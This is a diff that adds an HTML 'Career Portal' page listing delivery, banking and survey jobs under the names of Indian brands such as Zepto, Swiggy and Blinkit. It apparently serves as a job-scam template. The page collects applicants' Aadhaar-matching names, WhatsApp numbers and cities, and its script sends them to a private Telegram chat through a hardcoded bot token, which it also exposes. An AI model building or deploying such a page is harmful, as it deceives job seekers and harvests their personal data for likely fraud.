@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Professional Career Hub</title>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0062ff;
+            --secondary: #6366f1;
+            --success: #22c55e;
+            --dark: #1e293b;
+            --light: #f8fafc;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #f1f5f9;
+            margin: 0; padding: 15px;
+            color: var(--dark);
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            padding: 30px 20px;
+            border-radius: 20px;
+            color: white;
+            text-align: center;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 20px rgba(0,98,255,0.2);
+        }
+
+        .header h1 { margin: 0; font-size: 24px; letter-spacing: 1px; }
+        .header p { margin: 10px 0 0; opacity: 0.9; font-size: 14px; }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 20px 5px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Professional Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .card {
+            background: white;
+            padding: 15px;
+            border-radius: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .card:active { transform: scale(0.95); background: #fdfdfd; }
+
+        .card i {
+            font-size: 28px;
+            margin-bottom: 8px;
+            padding: 10px;
+            border-radius: 12px;
+        }
+
+        .card span { font-weight: 600; font-size: 13px; text-align: center; }
+        .card .tag { font-size: 10px; color: var(--primary); font-weight: 700; margin-top: 4px; }
+
+        /* Icon Colors */
+        .clr-delivery { color: #f97316; background: #fff7ed; }
+        .clr-bank { color: #0062ff; background: #eff6ff; }
+        .clr-survey { color: #a855f7; background: #faf5ff; }
+
+        /* Bottom Sheet Form (Professional Style) */
+        .modal {
+            display: none;
+            position: fixed;
+            bottom: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 9999;
+            align-items: flex-end;
+        }
+
+        .modal-content {
+            background: white;
+            width: 100%;
+            border-radius: 25px 25px 0 0;
+            padding: 25px;
+            box-sizing: border-box;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        .form-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .form-header h2 { font-size: 20px; margin: 0; color: var(--primary); }
+
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 6px; color: #64748b; }
+        .form-group input, .form-group select {
+            width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 10px;
+            font-size: 14px; outline: none; box-sizing: border-box;
+        }
+        .form-group input:focus { border-color: var(--primary); }
+
+        .btn-submit {
+            width: 100%; padding: 15px; background: var(--primary); color: white;
+            border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer;
+            margin-top: 10px; box-shadow: 0 4px 12px rgba(0,98,255,0.3);
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1><i class="ri-briefcase-4-fill"></i> Career Portal</h1>
+    <p>Premium Job Opportunities & Applications</p>
+</div>
+
+<div class="section-title"><i class="ri-truck-line"></i> Logistics & Delivery</div>
+<div class="grid">
+    <div class="card" onclick="openJob('Zepto Delivery', 'delivery')">
+        <i class="ri-flashlight-fill clr-delivery"></i>
+        <span>Zepto Delivery</span>
+        <div class="tag">NEW</div>
+    </div>
+    <div class="card" onclick="openJob('Swiggy Delivery', 'delivery')">
+        <i class="ri-riding-line clr-delivery"></i>
+        <span>Swiggy Boy</span>
+    </div>
+    <div class="card" onclick="openJob('Zomato Delivery', 'delivery')">
+        <i class="ri-motorbike-fill clr-delivery"></i>
+        <span>Zomato App</span>
+    </div>
+    <div class="card" onclick="openJob('Blinkit Delivery', 'delivery')">
+        <i class="ri-shopping-basket-2-fill clr-delivery"></i>
+        <span>Blinkit Job</span>
+    </div>
+    <div class="card" onclick="openJob('Shiprocket', 'delivery')">
+        <i class="ri-box-3-line clr-delivery"></i>
+        <span>Shiprocket</span>
+    </div>
+    <div class="card" onclick="openJob('Delhivery', 'delivery')">
+        <i class="ri-map-pin-user-fill clr-delivery"></i>
+        <span>Delhivery</span>
+    </div>
+</div>
+
+<div class="section-title"><i class="ri-bank-line"></i> Banking & Finance</div>
+<div class="grid">
+    <div class="card" onclick="openJob('Banking Executive', 'bank')">
+        <i class="ri-building-4-fill clr-bank"></i>
+        <span>Banking Job</span>
+    </div>
+    <div class="card" onclick="openJob('Finance Manager', 'bank')">
+        <i class="ri-money-dollar-circle-line clr-bank"></i>
+        <span>Finance Job</span>
+    </div>
+</div>
+
+<div class="section-title"><i class="ri-apps-2-line"></i> Tasks & Surveys</div>
+<div class="grid">
+    <div class="card" onclick="openJob('Blinkit Picker', 'task')">
+        <i class="ri-hand-coin-fill clr-survey"></i>
+        <span>Blinkit Picker</span>
+    </div>
+    <div class="card" onclick="openJob('Survey Job', 'task')">
+        <i class="ri-survey-line clr-survey"></i>
+        <span>Survey Job</span>
+    </div>
+</div>
+
+<div id="jobModal" class="modal">
+    <div class="modal-content">
+        <div class="form-header">
+            <h2 id="modalTitle">Apply Now</h2>
+            <i class="ri-close-circle-fill" style="font-size: 24px; color: #cbd5e1;" onclick="closeModal()"></i>
+        </div>
+        
+        <form id="proForm">
+            <input type="hidden" id="jobName">
+            
+            <div class="form-group">
+                <label>FULL NAME *</label>
+                <input type="text" id="userName" placeholder="As per Aadhaar" required>
+            </div>
+            <div class="form-group">
+                <label>WHATSAPP NUMBER *</label>
+                <input type="tel" id="userPhone" placeholder="+91 00000 00000" required>
+            </div>
+            <div class="form-group">
+                <label>CITY *</label>
+                <input type="text" id="userCity" placeholder="Your City" required>
+            </div>
+
+            <div id="deliveryFields" class="hidden">
+                <div class="form-group">
+                    <label>VEHICLE TYPE *</label>
+                    <select id="vehicle">
+                        <option value="Bike">Bike / Scooter</option>
+                        <option value="Cycle">Electric Cycle/Cycle</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>DRIVING LICENSE *</label>
+                    <select id="license">
+                        <option value="Yes">I have DL</option>
+                        <option value="No">No DL (Only for Cycle)</option>
+                    </select>
+                </div>
+            </div>
+
+            <div id="bankFields" class="hidden">
+                <div class="form-group">
+                    <label>QUALIFICATION *</label>
+                    <select id="edu">
+                        <option value="Graduate">Graduate</option>
+                        <option value="Post Graduate">Post Graduate</option>
+                        <option value="12th Pass">12th Pass</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>EXPERIENCE *</label>
+                    <input type="text" id="experience" placeholder="e.g. 1 Year in Sales">
+                </div>
+            </div>
+
+            <div id="taskFields" class="hidden">
+                <div class="form-group">
+                    <label>SHIFT PREFERENCE *</label>
+                    <select id="shift">
+                        <option value="Morning">Morning (6AM - 2PM)</option>
+                        <option value="Evening">Evening (2PM - 10PM)</option>
+                        <option value="Night">Night (Full Time)</option>
+                    </select>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">CONFIRM APPLICATION</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    // --- SETTINGS ---
+    const BOT_TOKEN = '8174208797:AAFkT2VwGrsXXWydZ3HGXZJTI0fWz_7g718'; // Apna Token Dalein
+    const CHAT_ID = '7918796164';       // Apni ID Dalein
+
+    function openJob(title, type) {
+        document.getElementById('jobModal').style.display = 'flex';
+        document.getElementById('modalTitle').innerText = title;
+        document.getElementById('jobName').value = title;
+
+        // Hide all extra fields first
+        document.getElementById('deliveryFields').classList.add('hidden');
+        document.getElementById('bankFields').classList.add('hidden');
+        document.getElementById('taskFields').classList.add('hidden');
+
+        // Show relevant fields
+        if(type === 'delivery') document.getElementById('deliveryFields').classList.remove('hidden');
+        if(type === 'bank') document.getElementById('bankFields').classList.remove('hidden');
+        if(type === 'task') document.getElementById('taskFields').classList.remove('hidden');
+    }
+
+    function closeModal() {
+        document.getElementById('jobModal').style.display = 'none';
+        document.getElementById('proForm').reset();
+    }
+
+    document.getElementById('proForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const job = document.getElementById('jobName').value;
+        const name = document.getElementById('userName').value;
+        const phone = document.getElementById('userPhone').value;
+        const city = document.getElementById('userCity').value;
+
+        let extraInfo = "";
+        
+        // Data collect based on visibility
+        if(!document.getElementById('deliveryFields').classList.contains('hidden')) {
+            extraInfo = `%0A🚲 *Vehicle:* ${document.getElementById('vehicle').value}%0A🪪 *License:* ${document.getElementById('license').value}`;
+        }
+        if(!document.getElementById('bankFields').classList.contains('hidden')) {
+            extraInfo = `%0A🎓 *Education:* ${document.getElementById('edu').value}%0A💼 *Exp:* ${document.getElementById('experience').value}`;
+        }
+        if(!document.getElementById('taskFields').classList.contains('hidden')) {
+            extraInfo = `%0A⏰ *Shift:* ${document.getElementById('shift').value}`;
+        }
+
+        const msg = `💼 *NEW APPLICATION*%0A━━━━━━━━━━━━━━━━%0A🎯 *Role:* ${job}%0A👤 *Name:* ${name}%0A📞 *WhatsApp:* ${phone}%0A📍 *City:* ${city}${extraInfo}%0A━━━━━━━━━━━━━━━━`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
+        .then(() => {
+            alert('Application Sent Successfully!');
+            closeModal();
+        }).catch(() => alert('Error sending data!'));
+    });
+</script>
+
+</body>
+</html>
+
